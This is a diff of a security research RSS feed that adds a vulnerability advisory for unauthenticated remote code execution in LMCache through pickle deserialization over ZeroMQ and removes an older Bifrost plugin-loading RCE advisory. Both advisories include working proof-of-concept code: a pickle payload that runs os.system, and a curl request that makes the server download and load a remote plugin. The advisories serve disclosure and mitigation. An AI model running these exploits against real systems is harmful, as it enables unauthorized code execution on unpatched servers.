@@ -4,11 +4,145 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Wed, 07 Oct 2026 00:42:25 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 07 Oct 2026 09:53:59 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</guid>
+            <pubDate>Wed, 07 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-105192, CRITICAL, LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
+
+
+## Component
+
+lmcache (github.com/LMCache/LMCache)
+
+## Affected versions
+
+>= 0.3.9
+
+## Description
+
+LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with `--host`, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.
+
+Messages on the socket are msgpack. Extension code 1 is registered for `DeviceIPCWrapper` and is passed to `DeviceIPCWrapper.Deserialize` in `lmcache/v1/platform/base/ipc_wrapper.py`, which calls `pickle.loads`. That hook runs from `ext_hook` in `lmcache/v1/multiprocess/custom_types.py` while the server is still decoding `REGISTER_KV_CACHE` arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.
+
+The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.
+
+## PoC
+
+<br>
+
+**Step 1 - Start multiprocess mode bound to a routable address**
+
+<br>
+
+This is the documented multi-node setting. The ZMQ transport listens on port 5555.
+
+```
+python -m lmcache.v1.multiprocess.http_server \
+    --http-host 127.0.0.1 --http-port 8080 \
+    --host 0.0.0.0 --port 5555 \
+    --l1-size-gb 0.25 --eviction-policy LRU \
+    --hash-algorithm blake3 --instance-id mp-node-01
+```
+
+<br>
+
+**Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle**
+
+<br>
+
+Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes `id` to `/tmp/zmq_pwn`.
+
+```
+import os
+import pickle
+import msgspec
+import zmq
+
+class EvilPayload:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))
+
+REGISTER_KV_CACHE = 1
+EXT_CODE = 1
+NUM_PAYLOADS = 7
+KVCACHE_INDEX = 1
+
+b_uid = msgspec.msgpack.encode(0)
+b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
+payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
+payloads[0] = msgspec.msgpack.encode(0)
+payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
+    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
+)
+frames = [b_uid, b_type, *payloads]
+```
+
+<br>
+
+**Step 3 - Send the frame**
+
+<br>
+
+```
+ctx = zmq.Context()
+s = ctx.socket(zmq.DEALER)
+s.connect("tcp://127.0.0.1:5555")
+s.send_multipart(frames)
+```
+
+<br>
+
+The pickle runs during argument decode. The server then logs a type error for `REGISTER_KV_CACHE` because the handler expected a `DeviceIPCWrapper` and received the return value of `os.system`. That error is after the command has already run.
+
+<br>
+
+**Step 4 - Confirm the command ran as the LMCache user**
+
+<br>
+
+```
+cat /tmp/zmq_pwn
+```
+
+<br>
+
+Expected output on an official image, where the process runs as root:
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Vulnerability Mitigations
+
+No fixed release is available as of 2026-10-07. The latest PyPI release is v0.5.5, and v0.5.6rc3 and the dev branch still call `pickle.loads` from `DeviceIPCWrapper.Deserialize`.
+
+Stop passing network bytes to pickle. Replace the serializer behind msgpack extension code 1 with a safe format, and do not call `pickle.loads` on data that arrived from an unauthenticated peer. Authenticate the ZMQ transport, for example with CURVE or an HMAC over each message, and refuse to bind a routable address unless that authentication is configured.
+
+Until a release includes that change, do not set `--host` to a routable address. Keep the multiprocess port on localhost or on a trusted cluster network. Limiting the port with a firewall reduces who can reach it. Any host that can open a connection to the port can still run code as the LMCache user.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-105192
+https://github.com/LMCache/LMCache
+https://pypi.org/project/lmcache/
+https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py
+https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[VTCode is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></title>
             <link>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</link>
@@ -988,121 +1122,6 @@ Until every host is on 27.0.0 or later, restrict local login on those Macs. Any 
 https://www.cve.org/CVERecord?id=CVE-2026-90894
 https://kb.parallels.com/en/131168
 https://www.parallels.com/products/desktop/
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Bifrost is vulnerable to Unauthenticated Remote Code Execution via a Custom Plugin HTTP Path on Dynamically Linked Builds]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-a-custom-plugin-http-path-on-dynamically-linked-builds-cve-2026-86242-jfsa-2026-001684572/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/bifrost-is-vulnerable-to-unauthenticated-remote-code-execution-via-a-custom-plugin-http-path-on-dynamically-linked-builds-cve-2026-86242-jfsa-2026-001684572/</guid>
-            <pubDate>Sun, 06 Sep 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-86242, HIGH, Bifrost is vulnerable to Unauthenticated Remote Code Execution via a Custom Plugin HTTP Path on Dynamically Linked Builds]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Bifrost is vulnerable to Unauthenticated Remote Code Execution via a Custom Plugin HTTP Path on Dynamically Linked Builds
-
-
-## Component
-
-Bifrost (github.com/maximhq/bifrost/transports)
-
-## Affected versions
-
-< 2.0.0
-
-## Description
-
-Bifrost HTTP transport before 2.0.0 accepts an enabled custom plugin whose path is an HTTP URL through unauthenticated POST /api/plugins when management authentication is disabled (the default, governance.auth_config.is_enabled=false). The shared-object loader treats an http-prefixed path as a download URL, writes the body to a temporary .so, and passes it to Go's plugin.Open. After a successful open, optional Init runs immediately with the supplied config as the Bifrost process user.
-
-On documented dynamically linked builds (DYNAMIC=1), which the vendor requires for custom Go plugins, plugin.Open is expected to succeed. That is unauthenticated remote code execution in the gateway process. On the published statically linked Docker image, plugin.Open fails with Dynamic loading not supported, so that build class is only server-side request forgery. A loadable plugin must also match the host Go version, operating system, architecture, and linkage. The stock bifrost-http binary binds localhost:8080; the official Docker image binds 0.0.0.0 but is statically linked. The 1.6.x HTTP transport line through 1.6.11 does not contain the fix.
-
-## PoC
-
-<br>
-
-**Step 1 - Build a dynamically linked Bifrost**
-
-<br>
-
-From a Bifrost transports checkout before 2.0.0, build with plugin support and run it with management authentication left disabled (the default). The management API must be reachable on the host and port you use below (the binary default is localhost:8080):
-
-```
-make build DYNAMIC=1
-```
-
-<br>
-
-**Step 2 - Build a canary plugin**
-
-<br>
-
-Build a Go shared object with the same Go version and libc as that binary. A minimal Init that writes a marker is enough:
-
-```
-package main
-
-import "os"
-
-func Init(config any) error {
-    return os.WriteFile("/tmp/bifrost-plugin-rce", []byte("PROVEN\n"), 0644)
-}
-
-func GetName() string { return "evilplugin" }
-
-func Cleanup() error { return nil }
-```
-
-```
-go build -buildmode=plugin -o /tmp/evilplugin.so main.go
-```
-
-<br>
-
-**Step 3 - Host the shared object and register it**
-
-<br>
-
-Serve /tmp/evilplugin.so over HTTP on an address the Bifrost host can reach, then create an enabled plugin with that URL as path. No authentication header is required:
-
-```
-curl -sS -X POST "http://127.0.0.1:8080/api/plugins" \
-  -H "Content-Type: application/json" \
-  -d "{\"name\": \"evilplugin\", \"enabled\": true, \"path\": \"http://<host>:<port>/evilplugin.so\"}"
-```
-
-<br>
-
-**Step 4 - Confirm the code ran**
-
-<br>
-
-Expected output on a dynamically linked build:
-
-```
-cat /tmp/bifrost-plugin-rce
-```
-
-```
-PROVEN
-```
-
-<br>
-
-On a static or official image instead, expect the download to succeed and plugin.Open to fail with Dynamic loading not supported.
-
-## Vulnerability Mitigations
-
-Upgrade Bifrost HTTP transport to 2.0.0 or later. The fix (https://github.com/maximhq/bifrost/pull/5763) refuses create and update of a non-builtin plugin path when the request was let through because dashboard authentication is disabled or unconfigured, and hardens the plugin downloader against SSRF. The 1.6.x line through 1.6.11 does not include this change.
-
-If custom Go plugins are not required, run the statically linked binary or official Docker image so plugin.Open cannot succeed. Otherwise enable dashboard authentication and keep the management listener off untrusted networks.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-86242
-https://github.com/maximhq/bifrost/security/advisories/GHSA-2qp8-4xgm-fw6g
-https://github.com/maximhq/bifrost/pull/5763
-https://github.com/maximhq/bifrost/commit/e0057ff355f831c251eabe9d0e44f3a3748532c6
-https://github.com/maximhq/bifrost/releases/tag/transports/v2.0.0
-https://github.com/maximhq/bifrost
 ]]></content:encoded>
         </item>
         <item>
